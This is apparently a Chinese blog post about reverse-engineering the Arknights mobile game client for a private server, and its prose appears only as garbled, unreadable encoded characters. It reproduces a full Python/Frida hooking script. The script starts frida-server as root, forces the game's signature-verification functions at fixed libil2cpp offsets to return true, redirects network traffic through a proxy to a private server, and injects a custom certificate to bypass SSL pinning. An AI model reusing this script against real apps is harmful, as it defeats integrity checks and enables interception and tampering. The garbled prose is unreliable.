p_char_209_ardign&quot;:0,&quot;p_char_212_ansel&quot;:0,&quot;p_char_199_yak&quot;:0,&quot;act13side_prestige_armorless&quot;:50},&quot;gacha&quot;:{&quot;normal&quot;:{&quot;NORM_25_0_2&quot;:{&quot;cnt&quot;:10,&quot;maxCnt&quot;:10,&quot;rarity&quot;:4,&quot;avail&quot;:false}},&quot;limit&quot;:{},&quot;newbee&quot;:{&quot;openFlag&quot;:1,&quot;cnt&quot;:20}}}}} ä»è¿™ä¸ªæ¶æ„æ¥çœ‹ï¼Œè¯¥æ¸¸æˆå®Œå…¨å¯ä»¥åšæˆä¸€ä¸ªå•æœºæ¸¸æˆï¼Œå…¶ç»å¤§éƒ¨åˆ†éƒ½æ˜¯å®¢æˆ·ç«¯è®¡ç®—ï¼Œæœ€ååªæ˜¯æŠŠä¸€äº›æ°ªé‡‘&amp;å…³å¡ç­‰ä¿¡æ¯ä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œè€Œä¸”å…¶æ‰©å±•æ€§ååˆ†ä¼˜ç§€ï¼Œæ¯æ¬¡éœ€è¦æ·»åŠ æ–°è§’è‰²æ—¶å€™ï¼Œåªéœ€è¦å®¢æˆ·ç«¯ä¸‹è½½å¯¹åº”idçš„å›¾åƒ&amp;è¯­éŸ³èµ„æºå°±å¯ä»¥ç›´æ¥ç»§ç»­è¿è¡Œï¼Œè€ŒæœåŠ¡ç«¯åªéœ€è¦æ·»åŠ ä¸€ä¸ªæ–°è§’è‰²çš„jsonæ•°æ®ã€‚ é¡ºå¸¦ä¸€æï¼Œåœ¨å¯¹å®˜æœæŠ“åŒ…åˆ†æçš„æ—¶å€™ï¼Œæˆ‘æ„å¤–å‘ç°ï¼Œå®˜æ–¹çš„ç½‘ç»œé…ç½®æ–‡ä»¶ 12ak-conf.hypergryph.comak.hypergryph.com è¿™ä¿©åŸŸåæŒ‡å‘äº†åŒä¸€ä¸ªæœåŠ¡å™¨ï¼Œä½¿ç”¨nginxè¿›è¡Œåå‘ä»£ç†ï¼Œå—¯å“¼ï¼Ÿ apkåˆ†æèµ·åˆæˆ‘ä»¥ä¸ºè¿™ä¸ªåªéœ€è¦æ‰‹æœºä¸Šå®‰è£…è¯ä¹¦ï¼Œç„¶åå°é»„é¸ŸæŠ“åŒ…å°±å¯ä»¥ç®€å•åˆ†æäº†ï¼Œç›´åˆ°æˆ‘å’‹å°è¯•éƒ½æ— æ³•æˆåŠŸåœ°æŠ“åˆ°åŒ…ï¼Œæˆ‘è¿™æ‰æ„è¯†åˆ°è¿™ä¹‹ä¸­ååˆ†ä¸ç®€å•ã€‚å› ä¸ºå½“æ—¶æˆ‘å¯¹SSL pinningå¹¶ä¸äº†è§£ï¼Œå°±ç›´æ¥ä»apkä¸‹æ‰‹äº†ã€‚æˆ‘æåˆ°äº†åŒç‰ˆæœ¬æœªè¢«ä¿®æ”¹è¿‡çš„apkï¼Œç„¶ååœ¨è¿™ä¹‹ä¸­å‘ç°äº†ä¸€äº›çŒ«è…»ã€‚ æˆ‘å¹¶ä¸ä¼šapké€†å‘ï¼Œæ‰€ä»¥å°±ç®€å•ç²—æš´çš„è§£å‹ç¼©apkç„¶åä½¿ç”¨crcæ¥æ‰¾ä¸åŒ å¯ä»¥çœ‹åˆ°classes.dexè¢«ä¿®æ”¹äº†ï¼Œè€Œä¸”åœ¨lib/arm64-v8a/ç›®å½•ä¸‹å¤šäº†ä¸ªlibhook.so æˆ‘ä¸å¤ªä¼šé€†å‘ï¼Œæ‰€ä»¥è¯´è¿™é‡Œæˆ‘ä¹Ÿä¸æ¸…æ¥šåˆ°åº•å¹²äº†ä»€ä¹ˆï¼Œä¸è¿‡æˆ‘å´æ‰¾åˆ°äº†ä¸ªæ›´æœ‰è¶£çš„ä¸œè¥¿: åœ¨res/xml/network_security_config.xml hookè¿‡çš„å®‰è£…åŒ…é‡Œé¢çš„è¿™ä¸ªæ–‡ä»¶å¤šäº†äº›å†…å®¹ SSL pinningé€šè¿‡ä¸€é€šæœç´¢ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå…³é”®è¯:SSL pinning å› ä¸ºæˆ‘å¹¶ä¸ä¼šé€†å‘ï¼Œåªèƒ½é€šè¿‡ç›¸å…³bypassåŸç†åè¿‡æ¥çŒœæµ‹æ­¤hookè¿‡çš„å®‰è£…åŒ…å®ç°æ–¹æ³•ï¼Œå¯èƒ½ä¼šæœ‰äº›è°¬è¯¯ï¼Œè¿˜è¯·åŒ…æ¶µ é¦–å…ˆï¼Œæˆ‘ä»¬å›è¿‡å¤´æ¥çœ‹ä¸€ä¸‹é…ç½®æ–‡ä»¶: 1{&quot;sign&quot;:&quot;liOYRfqui44FAHTZ3SoXtHJgl4Vj8vu90aumePes3Kh1A1Z4QVLCXtlG5h0EzfXsTKmdaBJjBaDkAaoR/BUt1JA+SdLIEzyb6BNjbgL5whdH8EQABSo/M5fYFn8QRjSbtQNl5tUK0cYJgCT3ODVnEmHKFqydrkjCPgVNyXU4Eyg=&quot;,&quot;content&quot;:&quot;{\\&quot;configVer\\&quot;:\\&quot;5\\&quot;,\\&quot;funcVer\\&quot;:\\&quot;V025\\&quot;,\\&quot;configs\\&quot;:{\\&quot;V025\\&quot;:{\\&quot;override\\&quot;:true,\\&quot;network\\&quot;:{\\&quot;gs\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660\\&quot;,\\&quot;as\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660\\&quot;,\\&quot;u8\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/u8\\&quot;,\\&quot;hu\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/assetbundle/official\\&quot;,\\&quot;hv\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/official/{0}/version\\&quot;,\\&quot;rc\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/official/remote_config\\&quot;,\\&quot;an\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/announce_meta/{0}/announcement.meta.json\\&quot;,\\&quot;prean\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/announce_meta/{0}/preannouncement.meta.json\\&quot;,\\&quot;sl\\&quot;:\\&quot;https://ak.hypergryph.com/protocol/service\\&quot;,\\&quot;of\\&quot;:\\&quot;https://ak.hypergryph.com/index.html\\&quot;,\\&quot;pkgAd\\&quot;:\\&quot;https://ak.hypergryph.com/download\\&quot;,\\&quot;pkgIOS\\&quot;:\\&quot;https://apps.apple.com/cn/app/id1454663939\\&quot;,\\&quot;secure\\&quot;:\\&quot;false\\&quot;}},\\&quot;V026\\&quot;:{\\&quot;override\\&quot;:true,\\&quot;network\\&quot;:{\\&quot;gs\\&quot;:\\&quot;https://ak-gs-gf.hypergryph.com\\&quot;,\\&quot;as\\&quot;:\\&quot;https://as.hypergryph.com\\&quot;,\\&quot;u8\\&quot;:\\&quot;https://as.hypergryph.com/u8\\&quot;,\\&quot;hu\\&quot;:\\&quot;https://ak.hycdn.cn/assetbundle/official\\&quot;,\\&quot;hv\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/official/{0}/version\\&quot;,\\&quot;rc\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/official/remote_config\\&quot;,\\&quot;an\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/announce_meta/{0}/announcement.meta.json\\&quot;,\\&quot;prean\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/announce_meta/{0}/preannouncement.meta.json\\&quot;,\\&quot;sl\\&quot;:\\&quot;https://ak.hypergryph.com/protocol/service\\&quot;,\\&quot;of\\&quot;:\\&quot;https://ak.hypergryph.com/index.html\\&quot;,\\&quot;pkgAd\\&quot;:\\&quot;https://ak.hypergryph.com/download\\&quot;,\\&quot;pkgIOS\\&quot;:\\&quot;https://apps.apple.com/cn/app/id1454663939\\&quot;,\\&quot;secure\\&quot;:\\&quot;false\\&quot;}}}}&quot;} è¿™é‡Œæœ‰ä¸ªsignååˆ†çš„æ˜¾çœ¼ è¿™æ˜¯ä¸€ä¸ªå½“æ—¶çš„ä½¿ç”¨fridaå¯¹å®˜æ–¹å®‰è£…åŒ…hookçš„æ•™ç¨‹é¡ºå¸¦ä¸€æï¼Œæ­¤æ¸¸æˆä½¿ç”¨çš„ä¹Ÿæ˜¯unityå¼•æ“ï¼Œlipcppï¼Œèƒ½dumpï¼Œä½†æ˜¯æˆ‘ä¸ä¼šç›¸å…³æ“ä½œï¼Œåäº†â€¦.åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œæˆ‘è¿˜æ³¨æ„åˆ°ï¼Œè£…è½½æ¸¸æˆæ ¸å¿ƒé€»è¾‘çš„lib2cpp.soå¹¶æ²¡æœ‰å¤ªå¤šçš„åŠ å¯†ï¼Œæœ‰çš„åªæ˜¯ä¸€äº›èŠ±æŒ‡ä»¤ä»¥åŠåidaçš„ä¸€äº›ä»£ç ï¼Œåˆ°æ˜¯unityæ¸¸æˆéƒ½å¿…é¡»é…å¥—çš„ä¸€ä¸ªgmæ–‡ä»¶åŠ å¯†äº†ï¼Œè¿™å’ŒåŸç¥ä¸å¤ªä¸€æ ·ï¼ŒåŸç¥æ˜¯æŠŠlib2cpp.soè¿›è¡Œä¸€äº›åç§»å’Œå¼‚æˆ–åŠ å¯† è¿™é‡Œæœ‰ä¸€ä¸ªå‡½æ•°ï¼ŒVerifySignMD5RSAï¼Œè¿™å°±æ¶‰åŠåˆ°ä¸€äº›å¯†ç å­¦åŸç†äº† public static Boolean VerifySignMD5RSA(String content, String sign, String publicKey) { } ç­¾åéªŒè¯è¿‡ç¨‹å¥½åƒæ˜¯éªŒè¯contentçš„hashï¼Œå¦‚æœcontenté‡Œæ”¹å˜äº†ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™ä¸ªéªŒè¯å°±ä¸é€šè¿‡äº†signåœ¨éªŒè¯ä»£ç ä¸­ï¼Œæ˜¯é€šè¿‡base64åŠ å¯†çš„ï¼Œç„¶åä¼ åˆ°å¦ä¸€ä¸ªå‚æ•°æ˜¯byteçš„VerifySignMD5RSAä¸­è¿›è¡ŒéªŒè¯publickeyï¼Œé¡¾åæ€ä¹‰å°±æ˜¯å…¬é’¥äº†ï¼Œç”¨æ¥è§£å¯†signçš„ï¼Œåœ¨æœåŠ¡ç«¯åº”è¯¥æ˜¯é€šè¿‡ç§é’¥è¿›è¡ŒåŠ å¯†çš„ æ³¨:å…¬é’¥æ˜¯ç›´æ¥å†™åœ¨å®¢æˆ·ç«¯é‡Œé¢çš„ æ‰€ä»¥è¯´ï¼Œåªè¦èƒ½hookåˆ°è¿™ä¸ªå‡½æ•°ï¼Œè®©å®ƒè¿”å›Trueå°±å¯ä»¥è¿‡æ‰è¿™é‡Œçš„éªŒè¯ï¼Œä»è€Œæ¬ºéª—å®¢æˆ·ç«¯ï¼Œè®©å®ƒè¿æ¥åˆ°æˆ‘è‡ªå·±çš„æœåŠ¡å™¨ä¸Šäº† ç„¶è€Œï¼Œè¿™åªæ˜¯ç¬¬ä¸€æ­¥ã€‚ è¿˜æœ‰ä¸€ä¸ªæ›´å¤´ç–¼çš„é—®é¢˜ï¼Œä¾¿æ˜¯æŠ“åŒ…çš„é—®é¢˜ï¼Œç°åœ¨å„å¤§å‚å®¶ä¸ºäº†é˜²æ­¢ä¸­é—´äººæ”»å‡»ï¼Œéƒ½ç›¸ç»§ä½¿ç”¨äº†è¯ä¹¦é”å®šï¼ˆSSL pinningï¼‰æŠ€æœ¯ï¼Œä¹Ÿå«HTTPå…¬é’¥å›ºå®š,é‡‡ç”¨å…¬é’¥å›ºå®šæ—¶ï¼Œç½‘ç«™ä¼šæä¾›å·²æˆæƒå…¬é’¥çš„å“ˆå¸Œåˆ—è¡¨ï¼ŒæŒ‡ç¤ºå®¢æˆ·ç«¯åœ¨åç»­é€šè®¯ä¸­åªæ¥å—åˆ—è¡¨ä¸Šçš„å…¬é’¥ã€‚ å®˜æ–¹æ–‡æ¡£:ç½‘ç»œå®‰å…¨é…ç½® ç„¶åâ€¦.æ‡‚çš„éƒ½æ‡‚äº†å§ å°±æ˜¯ä¸Šæ–‡æˆ‘å‘ç°çš„é‚£ä¸ªæ–‡ä»¶ï¼Œè¶Šæ¥è¶Šæœ‰æ„æ€äº†ï¼Œå—¯å“¼ï¼Ÿ ä¸è¿‡ï¼Œæˆ‘æ„Ÿè§‰å®˜æ–¹å…¶å®å¹¶æ²¡æœ‰èƒ½åŠ›è‡ªè¡Œè§£å†³è¿™äº›é—®é¢˜ï¼Œä¹‹åç‰ˆæœ¬æ›´æ–°ï¼ŒACEå‡ºç°äº†ã€‚ å½“ç„¶ï¼Œè¿™ä¸ªACEä¸æ˜¯é‚£ä¸ªACEå¤§å“¥ï¼Œæ˜¯è¿™ä¸ª è…¾è®¯åä½œå¼Š version 1.9.62[ä»‡ç™½ç‰ˆæœ¬]è¿™æ˜¯è¯¥æ‰‹æ¸¸ç°åœ¨çš„ç‰ˆæœ¬(2023/2) å¯¹æ¯”å»å¹´ï¼Œæ­¤ç‰ˆæœ¬åŠ äº†ä¸ªACEï¼Œå…³äºå®ƒçš„æŠ“åŒ…çœŸçš„æŠ˜ç£¨æ­»æˆ‘äº†ï¼Œæ„Ÿæ…¨ä¸€å¥ï¼ŒCTFå’ŒRealworldå·®åˆ«è¿˜æ˜¯æŒºå¤§çš„è¿™æ¬¡ï¼Œæ²¡æœ‰å‰äººé—ç•™ä¸‹æ¥çš„è„šæœ¬ï¼Œæˆ‘æœ‰çš„åªæœ‰ä¸€ä¸ªå¤–æŒ‚ä½œè€…å‘å‡ºæ¥çš„æ··æ·†æˆä¹è½¬å¤§è‚ çš„pycæ–‡ä»¶(è¿™ä¸ªæ··æ·†å°±æ˜¯æˆ‘ä¸Šå‘¨å‘¨æŠ¥å‘çš„pyobfuscate) å¤´ç–¼çš„æ˜¯ï¼Œä»–çš„ç§æœç”¨çš„æ˜¯httpsåŠ å¯†emmmm ç—›è‹¦çš„è¯ä¹¦å®‰è£…åœ¨ç ”ç©¶1.9.62æŠ“åŒ…æ–¹æ³•ï¼Œæˆ‘é¦–å…ˆæƒ³åˆ°ä¾¿æ˜¯å®‰è£…è¯ä¹¦ï¼Œåœ¨è£…åäº†å¥½å‡ ä¸ªå®‰å“æ¨¡æ‹Ÿå™¨ä¹‹åï¼Œæˆ‘æŠŠç›®å…‰æ”¾åœ¨äº†æˆ‘çš„å¹³æ¿ä¸Šé¢â€¦. è®ºç°åœ¨çš„å‚å•†ä¸ºäº†&quot;å®‰å…¨&quot;éƒ½åšäº†ä»€ä¹ˆåŠªåŠ› é—®é¢˜: è¯ä¹¦å®‰è£…ç°åœ¨ï¼Œå®‰å“11æ°¸è¿œä¸ä¿¡ä»»ç”¨æˆ·è¯ä¹¦ï¼Œä½ è£…è¿›å»åŸºæœ¬æ²¡ç”¨ï¼Œåº”ç”¨ç¨‹åºéƒ½åŸºæœ¬ä¸ä¼šä½¿ç”¨ç”¨æˆ·å®‰è£…è¯ä¹¦ï¼Œåªä¼šç”¨ç³»ç»Ÿæ ¹è¯ä¹¦ã€‚ ç„¶åâ€¦.æ›´æ›´æ›´æ¶å¿ƒçš„æ˜¯: æ ¹è¯ä¹¦åœ¨/system/etc/security/cacertsè¿™ä¸ªç›®å½•ä¸‹é¢ è¯¶å˜¿ï¼Œåªè¯»ç¯å¢ƒ é‡æ–°æŒ‚è½½ /system/bin/sh: remout: inaccessible or not found å°è¯•OverlayfsæŒ‚åˆ°/system/etc/security/cacertsï¼Œæ²¡æœ‰ç”¨å¤„ ç»è¿‡è‰°éš¾é™©é˜»ï¼Œåœ¨äº’è”ç½‘çš„ä¸€è§’ï¼Œæˆ‘çœ‹åˆ°äº†ç¬¬ä¸‰æ–¹recä¿®æ”¹ï¼Œç„¶åæˆ‘çš„å¹³æ¿æ˜¯å°ç±³å¹³æ¿5ï¼Œæ²¡æœ‰ç¬¬ä¸‰æ–¹Recoveryé€‚é… æœ€åï¼Œé…·å®‰å¸®åˆ°äº†æˆ‘ï¼Œåœ¨çˆ±ç©æœºå·¥å…·ç®±ä¸­ æœ‰ä¸ªè¿™ç©æ„ï¼Œèƒ½ç›´æ¥åšä¸ªæ¨¡å—å‡ºæ¥æ·¦è¿›ç³»ç»Ÿï¼Œç»ˆäºèƒ½æŠ“åˆ°åŒ…äº†â€¦.å—ï¼Ÿï¼Ÿ ACEå¤§å“¥å‡ºæ¥äº†ï¼Œå“ˆå¸Œé”å®šï¼Œè°éƒ½åˆ«æƒ³æŠ“åŒ… è„šæœ¬çš„åæ··æ·†åšåˆ°é‚£ä¸€æ­¥æˆ‘éƒ½è¦å¤´ç–¼æ­»äº†ï¼Œç„¶åå¯¹å¤–æŒ‚ä½œè€…æ··æ·†çš„ä»£ç ä¸€é€šè¾“å‡ºâ€¦(å…³äºåæ··æ·†çš„è¿‡ç¨‹ï¼Œæˆ‘å†™åœ¨äº†ä¸Šå‘¨çš„å‘¨æŠ¥äº†ï¼Œå°±æ˜¯é‚£ä¸ªpyobfuscateçš„åæ··æ·†) ç­‰æˆ‘æŠŠé‚£ä¸ªè„šæœ¬åæ··æ·†äº†ä¹‹åï¼Œæˆ‘å®Œå…¨å¯ä»¥ç”¨wiresharkæœ¬åœ°ç¯å›æŠ“åŒ…å°±è¡Œäº†ï¼Œå› ä¸ºè„šæœ¬é‡Œéƒ½æ˜¯adbå’Œfridaçš„æ“ä½œï¼Œè€Œè¿™ä¿©éƒ½æ˜¯ç›´æ¥æ˜æ–‡ä¼  æ­¤è„šæœ¬è¯·å‹¿å…¬å¼€ï¼Œä»…ä¾›å†…éƒ¨æŠ€æœ¯äº¤æµä½¿ç”¨ï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„éº»çƒ¦æ­¤è„šæœ¬è¯·å‹¿å…¬å¼€ï¼Œä»…ä¾›å†…éƒ¨æŠ€æœ¯äº¤æµä½¿ç”¨ï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„éº»çƒ¦æ­¤è„šæœ¬è¯·å‹¿å…¬å¼€ï¼Œä»…ä¾›å†…éƒ¨æŠ€æœ¯äº¤æµä½¿ç”¨ï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„éº»çƒ¦æ­¤è„šæœ¬è¯·å‹¿å…¬å¼€ï¼Œä»…ä¾›å†…éƒ¨æŠ€æœ¯äº¤æµä½¿ç”¨ï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„éº»çƒ¦æ­¤è„šæœ¬è¯·å‹¿å…¬å¼€ï¼Œä»…ä¾›å†…éƒ¨æŠ€æœ¯äº¤æµä½¿ç”¨ï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„éº»çƒ¦æ­¤è„šæœ¬è¯·å‹¿å…¬å¼€ï¼Œä»…ä¾›å†…éƒ¨æŠ€æœ¯äº¤æµä½¿ç”¨ï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„éº»çƒ¦æ­¤è„šæœ¬è¯·å‹¿å…¬å¼€ï¼Œä»…ä¾›å†…éƒ¨æŠ€æœ¯äº¤æµä½¿ç”¨ï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„éº»çƒ¦æ­¤è„šæœ¬è¯·å‹¿å…¬å¼€ï¼Œä»…ä¾›å†…éƒ¨æŠ€æœ¯äº¤æµä½¿ç”¨ï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„éº»çƒ¦æ­¤è„šæœ¬è¯·å‹¿å…¬å¼€ï¼Œä»…ä¾›å†…éƒ¨æŠ€æœ¯äº¤æµä½¿ç”¨ï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„éº»çƒ¦æ­¤è„šæœ¬è¯·å‹¿å…¬å¼€ï¼Œä»…ä¾›å†…éƒ¨æŠ€æœ¯äº¤æµä½¿ç”¨ï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„éº»çƒ¦æ­¤è„šæœ¬è¯·å‹¿å…¬å¼€ï¼Œä»…ä¾›å†…éƒ¨æŠ€æœ¯äº¤æµä½¿ç”¨ï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„éº»çƒ¦ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192# -*- coding: utf-8 -*-import argparseimport sysimport timefrom base64 import b64decodeimport fridafrom adbutils import adbfrom loguru import loggerARG = b64decode(&quot;ç§æœURL&quot;).decode()def on_message(message, data): print(&quot;[%s] =&gt; %s&quot; % (message, data))def main(use_mumu=False, attach=False): try: adb_device = adb.device_list()[0] except IndexError: default_ports = [&quot;5555&quot;, &quot;7555&quot;, &quot;62001&quot;, &quot;62025&quot;] for port in default_ports: logger.info(f&quot;Try port {port}...&quot;) adb.connect(f&quot;127.0.0.1:{port}&quot;) time.sleep(0.5) if len(adb.device_list()) &gt; 0: logger.info(&quot;Connected to device&quot;) adb_device = adb.device_list()[0] if adb_device.shell(&quot;command -v su&quot;) == &quot;&quot;: logger.error(&quot;Please give Emulator Root permission, Exiting...&quot;) sys.exit(1) if adb_device.shell(&quot;pidof frida-server&quot;) == &quot;&quot;: logger.info(&quot;Loading...&quot;) adb_device.shell(&quot;su -c \\&quot;/data/local/tmp/frida-server -D\\&quot;&quot;) time.sleep(1) if not attach: device = frida.get_usb_device(timeout=1) pid = device.spawn(b64decode('Y29tLmh5cGVyZ3J5cGguYXJrbmlnaHRz').decode()) device.resume(pid) session = device.attach(pid) else: device = frida.get_usb_device(timeout=1) session = device.attach('Arknights') script = session.create_script(&quot;&quot;&quot;function _0x13812a(_0x363014, _0x1394d6) {{ Java.perform(function (){{ var _0x1a0c09 = Java.use(&quot;java.net.URL&quot;); var _0x1bcad5 = Java.use('java.net.Proxy$Type'); var _0x579e72 = Java.use(&quot;java.net.InetSocketAddress&quot;); var _0x599d05 = Java.use('java.net.Proxy'); _0x1a0c09.$init.overload('java.lang.String').implementation = function (var0) {{ return this.$init(var0); }}; _0x1a0c09.openConnection.overload().implementation = function () {{ var _0x47ed4a; try{{ _0x47ed4a = _0x599d05.$new(_0x1bcad5.valueOf('HTTP'), _0x579e72.$new(_0x363014, _0x1394d6)); }} catch(e){{ console.log(e); }} return this.openConnection(_0x47ed4a); }}; }});}}function _0x215797(_0x5df837){{ Java.perform(function (){{ var _0x4a7b21 = Java.use(&quot;java.security.cert.CertificateFactory&quot;); var _0x7df8e3 = Java.use(&quot;java.io.FileInputStream&quot;); var _0x35c5e4 = Java.use(&quot;java.io.BufferedInputStream&quot;); var _0x4b6699 = Java.use(&quot;java.security.KeyStore&quot;); var _0x5c2a78 = Java.use(&quot;javax.net.ssl.TrustManagerFactory&quot;); var _0x1689b3 = Java.use(&quot;javax.net.ssl.SSLContext&quot;); var _0x251a51 = _0x4a7b21.getInstance(&quot;X.509&quot;); try {{ var _0x3cc1c8 = _0x7df8e3.$new(_0x5df837); }} catch(_0x565757) {{ console.log(&quot;[o] &quot; + _0x565757); }} var _0x3a7e1c = _0x35c5e4.$new(_0x3cc1c8); var _0x5417ee = _0x251a51.generateCertificate(_0x3a7e1c); _0x3a7e1c.close(); var _0x2ee0dd = _0x4b6699.getDefaultType(); var _0x10c4b0 = _0x4b6699.getInstance(_0x2ee0dd); _0x10c4b0.load(null, null); _0x10c4b0.setCertificateEntry(&quot;ca&quot;, _0x5417ee); var _0x32527e = _0x5c2a78.getDefaultAlgorithm(); var _0x257ee8 = _0x5c2a78.getInstance(_0x32527e); _0x257ee8.init(_0x10c4b0); _0x1689b3.init.overload(&quot;[Ljavax.net.ssl.KeyManager;&quot;, &quot;[Ljavax.net.ssl.TrustManager;&quot;, &quot;java.security.SecureRandom&quot;).implementation = function(_0x26f6a3,b,_0x43a1f8) {{ _0x1689b3.init.overload(&quot;[Ljavax.net.ssl.KeyManager;&quot;, &quot;[Ljavax.net.ssl.TrustManager;&quot;, &quot;java.security.SecureRandom&quot;).call(this, _0x26f6a3, _0x257ee8.getTrustManagers(), _0x43a1f8); }} }});}}function _0xf3fffe(_0x2ff147){{ var _0x26f6e2 = Process.getModuleByName(&quot;libil2cpp.so&quot;); var _0x38210d = _0x26f6e2.base.add(_0x2ff147); return new NativePointer(_0x38210d.toString());}}function _0x25d96d(_0x2deb5e) {{ var _0x2366a9 = _0xf3fffe(_0x2deb5e); Interceptor.attach(_0x2366a9,{{ onEnter: function(args){{}}, onLeave: function(retval){{ retval.replace(0x1); }} }});}}function _0x2e4db4(_0x55aa43) {{ var _0x357967 = _0xf3fffe(_0x55aa43); Interceptor.attach(_0x357967,{{ onEnter: function(args){{}}, onLeave: function(_0x41e085){{ _0x41e085.replace(0x0); }} }});}}function _0x2679e6(_0x4b81fb) {{ var _0x4f51f0 = _0xf3fffe(_0x4b81fb); Interceptor.attach(_0x4f51f0,{{ onEnter: function(args){{ }}, onLeave: function(retval){{ }} }});}}function _0x51a5b1(){{ //mainå‡½æ•° var _0x4ba0b9 = &quot;{ARG}&quot;; var _0x51e879 = 8080; var _0x2eeed0 = &quot;/data/local/tmp/cert.cer&quot;; var _0xdc6e3d = function (e) {{ //ä»£ç† var _0x360bad = setInterval(function () {{ //è¿‡hook var _0x405ec9 = Module.findBaseAddress(&quot;libil2cpp.so&quot;); if (_0x405ec9) {{ clearInterval(_0x360bad); e(+_0x405ec9); return; }} }}, 0); }} _0xdc6e3d(()=&gt;{{ [0xfe978f, 0x362b87e].forEach(_0x25d96d); //åç§»ï¼Œx86 [0xfde384].forEach(_0x2e4db4); }}); _0x13812a(_0x4ba0b9, _0x51e879); _0x215797(_0x2eeed0);}}_0x51a5b1();&quot;&quot;&quot;.format(ARG=ARG)) script.on('message', on_message) script.load() print(&quot; _____ _ _ _ _ &quot;) print(&quot; | __ \\| | (_) | | | | &quot;) print(&quot; | |__) | |__ _ _ __ ___ | | __ _| |__ &quot;) print(&quot; | _ /| '_ \\| | '_ \\ / _ \\ | | / _` | '_ \\ &quot;) print(&quot; | | \\ \\| | | | | | | | __/ | |___| (_| | |_) |&quot;) print(&quot; |_| \\_\\_| |_|_|_| |_|\\___| |______\\__,_|_.__/ &quot;) print(&quot; &quot;) print(&quot;t.me/RhineServer\\n&quot;) print(&quot;Success!&quot;) print(&quot;Please do NOT close the window.\\n&quot;) sys.stdin.read() session.detach()if __name__ == '__main__': args = argparse.ArgumentParser(description='RhineLab Hooking Script') args.add_argument('-a', '--attach', action='store_true', help='attach') args.add_argument('-m', '--mumu', action='store_true', help='mumu') args = args.parse_args() try: main(args.mumu, args.attach) except KeyboardInterrupt: if len(adb.device_list()) &gt; 0: logger.info(&quot;Exiting...&quot;) adb_device = adb.device_list()[0] adb_device.shell(&quot;su -c \\&quot;kill `pidof frida-server`\\&quot;&quot;) Jséƒ¨åˆ†çš„æ··æ·†åªæ˜¯æœ€ç®€å•çš„å˜é‡åæ›¿æ¢ï¼Œç½‘ä¸Šæœç´¢frida SSL unpinningèƒ½æ‰¾åˆ°ç›¸ä¼¼çš„ä»£ç ï¼Œæ­¤å¤„jsä»£ç åªæ˜¯å¤šäº†ä¸€ä¸ªè¿‡hookçš„æ“ä½œ å¯ä»¥æŠ“åŒ…äº†â€¦.å—ï¼Ÿï¼ŸæˆåŠŸæ‹¿åˆ°hookçš„è„šæœ¬ä¹‹åï¼Œæ’¸èµ·è¢–å­å¼€å§‹å¹²ï¼Œå‡†å¤‡æŠ“åŒ…äº†ï¼Œç„¶åâ€¦. åŠ è½½æ—¶å€™çš„åŒ…éƒ½æœ‰ï¼Œä½†æ˜¯â€¦ç­‰æˆ‘ç™»å½•è¿›å»ï¼ŒæŠ½å¡ï¼Œç­¾åˆ°ç­‰ç­‰æ“ä½œï¼Œæˆ‘å§‹ç»ˆæ²¡æœ‰çœ‹åˆ°ä»»æ„ä¸€ä¸ªåŒ…å‡ºç°åœ¨æˆ‘çš„æŠ“åŒ…è½¯ä»¶ä¸Šï¼Œä¸ºæ­¤æˆ‘è¿˜æ¢äº†å¥½å‡ ç§æŠ“åŒ…è½¯ä»¶ï¼Œburpsuite,mitm,â€¦ APPå„ç§æŠ“åŒ…æ•™ç¨‹ Hook | SSL Pinning |Frida éƒ½æ²¡æŠ“åˆ°emmmï¼Œæ‰“å¼€wiresharkçœ‹åˆ°äº†ä¸€æ®µSSLæµé‡ï¼Œä½†å°±æ˜¯æŠ“ä¸åˆ°åŒ…(è¿™nmä»€ä¹ˆæ´»å•Š) ç„¶åï¼Œæˆ‘ç”¨mitm æ•´äº†ä¸€ä¸ªæ‰‹åŠ¨ä¸­é—´äººæ”»å‡»â€¦ å¤§è‡´æ¶æ„æ˜¯è¿™æ ·å­çš„: è¿˜è®°å¾—æˆ‘ä¹‹å‰è¯´ï¼ŒåŠ è½½ç½‘ç»œé…ç½®é‚£ä¸ªæ¡¥æ®µå—ï¼Ÿï¼Œæˆ‘æŠŠä¸Šé¢çš„æ‰€æœ‰ç½‘å€å…¨éƒ½æ¢æˆhttp://127.0.0.1,ç„¶åmitmå°±èƒ½æŠ“åˆ°æ‰€æœ‰çš„httpè¯·æ±‚äº†ï¼Œå†ç„¶åæˆ‘æ‹¿ç€è¿™äº›httpè¯·æ±‚ï¼Œæ‰‹åŠ¨æ“ä¸€ä¸ªrequest åˆ«é—®æˆ‘ä¸ºå•¥ä¸ç”¨mitmçš„pythonapiï¼Œé—®å°±æ˜¯è¿˜åœ¨å­¦ â€œæŠ“â€åˆ°äº† 